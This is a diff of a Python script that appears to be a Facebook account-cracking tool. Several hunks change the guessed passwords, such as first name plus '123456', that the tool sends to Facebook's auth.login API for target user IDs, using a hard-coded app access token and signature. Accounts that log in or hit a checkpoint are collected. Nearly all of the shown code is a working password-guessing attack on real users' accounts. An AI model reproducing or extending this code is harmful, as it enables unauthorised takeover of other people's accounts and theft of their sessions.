@@ -1106,7 +1106,7 @@ def mini():
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
-												pz6 = "kontol123"
+												pz6 = "1234554321"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												y = json.load(data)
 												if 'access_token' in y:
@@ -1126,7 +1126,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "sayang123"
+														pz7 = "1122334455"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
@@ -1397,7 +1397,7 @@ def pilih_super():
 											cekpoint.append(user+pass4)
 										else:
 											#Pass5
-											pass5 = "sayang123"
+											pass5 = "1122334455"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -1413,7 +1413,7 @@ def pilih_super():
 													cekpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "kontol123"
+													pass6 = "1234554321"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1431,7 +1431,7 @@ def pilih_super():
 															#Pass7
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass8 = b['first_name']+'doraemon12345'
+															pass8 = b['first_name']+'123456'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
